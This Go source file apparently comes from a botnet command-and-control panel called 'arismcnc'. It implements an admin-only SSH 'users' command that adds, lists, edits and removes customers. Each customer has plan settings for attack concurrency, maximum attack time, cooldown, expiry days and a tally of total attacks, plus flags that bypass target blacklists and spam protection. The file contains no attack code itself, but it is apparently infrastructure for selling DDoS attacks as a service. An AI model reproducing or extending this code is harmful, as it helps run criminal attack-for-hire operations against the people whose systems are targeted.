package cmds

import (
	"arismcnc/database"
	"arismcnc/utils"
	"fmt"
	"io"
	"log"
	"strconv"
	"strings"
	"text/tabwriter"
	"time"

	"github.com/gliderlabs/ssh"
)

type UsersCommand struct{}

func (c *UsersCommand) Name() string {
	return "users"
}

func (c *UsersCommand) Execute(session ssh.Session, db *database.Database, args []string, output io.Writer) {
	if len(args) < 1 {
		fmt.Fprintln(output, "users list\nusers add\nusers remove <username>\nusers count\nusers viewplan <username>\nusers edit <username> <option> <value>")
		return
	}

	switch args[0] {
	case "list":
		c.listUsers(db, output)
	case "add":
		c.addUser(session, db, output)
	case "count":
		c.countUsers(db, output)
	case "viewplan":
		if len(args) < 2 {
			fmt.Fprintln(output, "Usage: users viewplan <username>")
		} else {
			c.viewPlan(session, db, args[1], output)
		}
	case "edit":
		if len(args) < 4 {
			displayEditOptions(session)
		} else {
			c.editUser(session, db, args[1], args[2], args[3], output)
		}
	case "remove":
		if len(args) < 2 {
			fmt.Fprintln(output, "Usage: users remove <username>")
		} else {
			c.removeUser(session, db, args[1], output)
		}
	default:
		fmt.Fprintln(output, "users list\nusers add\nusers remove <username>\nusers count\nusers viewplan <username>\nusers edit <username> <option> <value>")
	}
}

func (c *UsersCommand) editUser(session ssh.Session, db *database.Database, username string, option string, value string, output io.Writer) {
	// Check if the username exists
	exists, err := db.UserExists(username)
	if err != nil {
		fmt.Fprintf(output, "Error checking if user exists: %s\n", err)
		return
	}

	if !exists {
		fmt.Fprintf(output, "User %s does not exist.\n", username)
		return
	}

	// Supported fields to edit
	validFields := map[string]string{
		"username":           "username",
		"password":           "password",
		"admin":              "admin",
		"vip":                "vip",
		"private":            "private",
		"concurrents":        "concurrents",
		"cooldown":           "cooldown",
		"maxtime":            "maxtime",
		"api_access":         "api_access",
		"powersaving_bypass": "powersaving_bypass",
		"spam_bypass":        "spam_bypass",
		"blacklist_bypass":   "blacklist_bypass",
	}

	if option == "add_days" || option == "set_days" {
		// Handle add_days or set_days separately
		days, err := strconv.Atoi(value)
		if err != nil {
			fmt.Fprintln(output, "Invalid value for days. Must be an integer.")
			return
		}

		if option == "add_days" {
			err = db.AddDaysToExpiry(username, days)
			if err != nil {
				fmt.Fprintf(output, "Failed to add days to expiry: %s\n", err)
				return
			}
			fmt.Fprintf(output, "Successfully added %d days to user %s's expiry.\n", days, username)
		} else if option == "set_days" {
			err = db.SetDaysForExpiry(username, days)
			if err != nil {
				fmt.Fprintf(output, "Failed to set expiry days: %s\n", err)
				return
			}
			fmt.Fprintf(output, "Successfully set expiry to %d days for user %s.\n", days, username)
		}
		return
	}

	// Check if the option is valid
	column, valid := validFields[option]
	if !valid {
		displayEditOptions(session)
		return
	}

	// Handle boolean conversion for fields like admin, vip, etc.
	if column == "admin" || column == "vip" || column == "private" || column == "api_access" || column == "powersaving_bypass" || column == "spam_bypass" || column == "blacklist_bypass" {
		value = strconv.Itoa(yesNoToBool(value))
	}

	// Update the specified field in the database
	err = db.ChangeOption(username, column, value)
	if err != nil {
		fmt.Fprintf(output, "Failed to update user: %s\n", err)
		return
	}

	fmt.Fprintf(output, "User %s successfully updated. Field '%s' set to '%s'.\n", username, option, value)
}

func displayEditOptions(output io.Writer) {
	table := `All list of usages:
users edit USERNAME username           NEWUSERNAME
users edit USERNAME password           NEWPASSWORD
users edit USERNAME maxtime            AMOUNT
users edit USERNAME concurrents        AMOUNT
users edit USERNAME cooldown           AMOUNT
users edit USERNAME admin              TRUE/FALSE
users edit USERNAME vip                TRUE/FALSE
users edit USERNAME private            TRUE/FALSE
users edit USERNAME powersaving_bypass TRUE/FALSE
users edit USERNAME spam_bypass        TRUE/FALSE
users edit USERNAME blacklist_bypass   TRUE/FALSE
users edit USERNAME api_access         TRUE/FALSE
users edit USERNAME add_days           AMOUNT
users edit USERNAME set_days           AMOUNT
`

	fmt.Fprintln(output, table)
}

// Utility function to list valid options
func getValidOptions(fields map[string]string) string {
	keys := make([]string, 0, len(fields))
	for key := range fields {
		keys = append(keys, key)
	}
	return strings.Join(keys, ", ")
}

// yesNoToBool converts "yes", "y", "true" to 1, and everything else to 0
func yesNoToBool(input string) int {
	lower := strings.ToLower(input)
	if lower == "y" || lower == "yes" || lower == "true" {
		return 1
	}
	return 0
}

func (c *UsersCommand) viewPlan(session ssh.Session, db *database.Database, username string, output io.Writer) {
	userInfo := db.GetAccountInfo(username)
	expiryTime, err := time.Parse("2006-01-02 15:04:05", userInfo.Expiry)
	if err != nil {
		log.Print("Username not found!")
		fmt.Fprintln(output, "User not found!")
		return
	}

	planBranding := utils.Branding(session, "account-details", map[string]interface{}{
		"user.Username":            session.User(),
		"user.Expiry":              utils.CalculateExpiryString(expiryTime),
		"user.Admin":               utils.CalculateInt(userInfo.Admin),
		"user.Vip":                 utils.CalculateInt(userInfo.Vip),
		"user.Private":             utils.CalculateInt(userInfo.Private),
		"user.Concurrents":         strconv.Itoa(userInfo.Concurrents),
		"user.Cooldown":            strconv.Itoa(userInfo.Cooldown),
		"user.Maxtime":             strconv.Itoa(userInfo.Maxtime),
		"user.Api_access":          utils.CalculateInt(userInfo.ApiAccess),
		"user.Power_saving_bypass": utils.CalculateInt(userInfo.PowerSaving),
		"user.Spam_bypass":         utils.CalculateInt(userInfo.BypassSpam),
		"user.Blacklist_bypass":    utils.CalculateInt(userInfo.BypassBlacklist),
		"user.SSH_Client":          session.Context().ClientVersion(),
		"user.Created_by":          userInfo.CreatedBy,
		"user.Total_attacks":       strconv.Itoa(db.GetUserTotalAttacks(userInfo.Username)),
		"clear":                    "\x1b[2J \x1b[H",
		"sleep": func(duration int) {
			time.Sleep(time.Duration(duration) * time.Millisecond)
		},
	})

	fmt.Fprintln(output, planBranding)
}

func (c *UsersCommand) removeUser(session ssh.Session, db *database.Database, username string, output io.Writer) {
	exists, err := db.UserExists(username)
	if err != nil {
		fmt.Fprintf(output, "Error checking if user exists: %s\n", err)
		return
	}

	if !exists {
		fmt.Fprintf(output, "User %s does not exist.\n", username)
		return
	}

	success, err := db.RemoveUser(username)
	if err != nil {
		fmt.Fprintln(output, "Failed to remove user:", err)
	} else if success {
		fmt.Fprintln(output, "removed successfully.")
	}
}

func (c *UsersCommand) listUsers(db *database.Database, output io.Writer) {
	users, err := db.GetAllUsers()
	if err != nil {
		fmt.Fprintln(output, "Error retrieving users:", err)
		return
	}

	w := tabwriter.NewWriter(output, 0, 0, 2, ' ', 0)
	fmt.Fprintln(w, "\033[37;1m#\t Username  \t Time \t Concs \t CD \t Expiry       \t Roles      \033[0m")
	fmt.Fprintln(w, "\033[37;1m--\t --------  \t ---- \t ----- \t -- \t --------- \t ---------- \033[0m")

	for index, user := range users {
		roleLabels := utils.GenerateRoleLabels(user.Admin, user.Vip, user.Private)
		expiryTime, err := time.Parse("2006-01-02 15:04:05", user.Expiry)
		if err != nil {
			log.Print(err)
		}
		fmt.Fprintf(w, "\033[37;1m%d\t %s\t %d\t %d\t %d\t %s\t %s\033[0m\n",
			index+1, user.Username, user.Maxtime, user.Concurrents, user.Cooldown,
			utils.CalculateExpiryString(expiryTime), roleLabels)
	}

	w.Flush()
}

func (c *UsersCommand) countUsers(db *database.Database, output io.Writer) {
	total_users := db.GetTotalUsers()
	total_active_users := db.GetTotalActiveUsers()
	total_expired_users := db.GetTotalExpiredUsers()

	fmt.Fprintln(output, "\033[37;1mTotal Users: "+strconv.Itoa(total_users))
	fmt.Fprintln(output, "\033[37;1mActive Users: "+strconv.Itoa(total_active_users))
	fmt.Fprintln(output, "\033[37;1mExpired Users: "+strconv.Itoa(total_expired_users)+"\n\033[0m")
}

func (c *UsersCommand) addUser(session ssh.Session, db *database.Database, output io.Writer) {
	prompt := func(question string) string {
		fmt.Fprint(output, "\033[37;1m"+question)
		line, _ := utils.ReadLine(session)
		return strings.TrimSpace(line)
	}

	username := prompt("Enter Username: ")
	password := prompt("Enter Password: ")

	concurrents, err := strconv.Atoi(prompt("Concurrents: "))
	if err != nil {
		fmt.Fprintln(output, "Invalid input for concurrents.")
		return
	}

	maxtime, err := strconv.Atoi(prompt("MaxTime In Seconds: "))
	if err != nil {
		fmt.Fprintln(output, "Invalid input for maxtime.")
		return
	}

	planLengthDays, err := strconv.Atoi(prompt("Set Plan Length In Days: "))
	if err != nil {
		fmt.Fprintln(output, "Invalid input for plan length.")
		return
	}

	// Convert boolean responses to integers for database compatibility
	apiAccess := 0
	if prompt("API Access account? [y/n]: ") == "y" {
		apiAccess = 1
	}

	vip := 0
	if prompt("VIP account? [y/n]: ") == "y" {
		vip = 1
	}

	cooldown, err := strconv.Atoi(prompt("Cooldown In Seconds: "))
	if err != nil {
		fmt.Fprintln(output, "Invalid input for cooldown.")
		return
	}

	admin := 0
	if prompt("Admin account? [y/n]: ") == "y" {
		admin = 1
	}

	bypassPowerSaving := 0
	if prompt("Bypass PowerSaving account? [y/n]: ") == "y" {
		bypassPowerSaving = 1
	}

	bypassSpamProtection := 0
	if prompt("Bypass Spam Protection account? [y/n]: ") == "y" {
		bypassSpamProtection = 1
	}

	bypassBlacklist := 0
	if prompt("Bypass Blacklist account? [y/n]: ") == "y" {
		bypassBlacklist = 1
	}

	// Insert into the database
	err = db.AddUser(database.User2{
		Username:             username,
		Password:             password,
		Concurrents:          concurrents,
		MaxTime:              maxtime,
		PlanLengthDays:       planLengthDays,
		APIAccess:            apiAccess,
		VIP:                  vip,
		Cooldown:             cooldown,
		Admin:                admin,
		BypassPowerSaving:    bypassPowerSaving,
		BypassSpamProtection: bypassSpamProtection,
		BypassBlacklist:      bypassBlacklist,
		CreatedBy:            session.User(),
	})

	if err != nil {
		log.Printf("Error adding user to database: %v", err)
		fmt.Fprintln(output, "Failed to add user.")
		return
	}

	fmt.Fprintf(output, "User %s was successfully added to the database.\n", username)
}

func (c *UsersCommand) AdminOnly() bool {
	return true
}

func (c *UsersCommand) Aliases() []string {
	return []string{"user", "users"}
}

func init() {
	CommandMap["users"] = &UsersCommand{}
}
